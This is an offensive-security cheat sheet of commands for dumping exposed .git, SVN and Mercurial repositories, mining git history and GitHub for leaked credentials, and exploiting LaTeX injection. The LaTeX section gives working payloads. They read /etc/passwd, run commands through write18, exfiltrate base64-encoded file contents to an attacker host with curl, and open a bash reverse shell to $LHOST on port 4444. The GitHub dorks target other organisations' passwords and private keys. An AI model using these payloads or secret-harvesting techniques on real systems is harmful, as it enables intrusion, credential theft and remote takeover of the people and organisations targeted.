# Git Exposure & LaTeX Injection

**Tags:** #git #osint #lfi #latex #web-exploitation

---

## Exposed .git Directory

```bash
# Check if .git is exposed
curl http://$TARGET/.git/HEAD
curl http://$TARGET/.git/config

# Dump with git-dumper
git-dumper http://$TARGET/.git/ ./dumped_repo
pip install git-dumper && git-dumper http://$TARGET/.git/ ./repo

# GitTools (alternative)
./gittools/Dumper/gitdumper.sh http://$TARGET/.git/ repo/
./gittools/Extractor/extractor.sh repo/ extracted/

# After dumping — inspect history for secrets
cd dumped_repo
git log --all --oneline
git log --all -p | grep -i "password\|secret\|key\|token\|api"
git stash list
git show HEAD~5:config.php
git diff HEAD~1 HEAD
```

## Git History Mining (Source Code Repos)

```bash
# Clone and search history
git clone $REPO_URL repo && cd repo
git log --all --oneline
git log --all --format="%H" | xargs -I{} git show {} | grep -i "password\|secret\|key\|token"

# trufflehog — secrets in git history
trufflehog git file://./repo --only-verified
trufflehog github --repo https://github.com/company/repo

# gitleaks
gitleaks detect -s ./repo --verbose
gitleaks git -s ./repo
```

## GitHub OSINT

```bash
# Search GitHub for leaked secrets
gh search code "corp.com password" --limit 50
gh search code "api.corp.com" --limit 50

# GitHub dorking (browser)
# "corp.com" password
# "corp.com" api_key
# "corp.com" BEGIN RSA PRIVATE KEY
# org:CompanyName filename:.env
# org:CompanyName filename:config.php DB_PASSWORD
```

## SVN / Mercurial Exposure

```bash
# SVN
curl http://$TARGET/.svn/entries
svn checkout http://$TARGET/.svn/ ./svn_dump

# Mercurial
curl http://$TARGET/.hg/
python3 dvcs-ripper/rip-hg.py -u http://$TARGET/.hg/
```

## LaTeX Injection

```bash
# Read local files (in LaTeX compile context)
\input{/etc/passwd}
\include{/etc/passwd}
\lstinputlisting{/etc/passwd}
\usepackage{verbatim}\verbatiminput{/etc/passwd}

# Escape out and run commands
\immediate\write18{id > /tmp/out.txt}
\input{|"id > /tmp/out.txt"}

# Exfiltrate via URL (if internet allowed)
\immediate\write18{curl http://$LHOST/?x=$(cat /etc/passwd | base64)}

# Working reverse shell payload
\immediate\write18{bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'}

# Exfil via DNS
\immediate\write18{curl $LHOST/$(cat /etc/passwd | base64 | tr -d '\n')}
```

## Related Notes

- [[01-Reconnaissance/Passive-OSINT]] — GitHub secret hunting
- [[00-Quick-Reference/LFI]] — File inclusion after source read
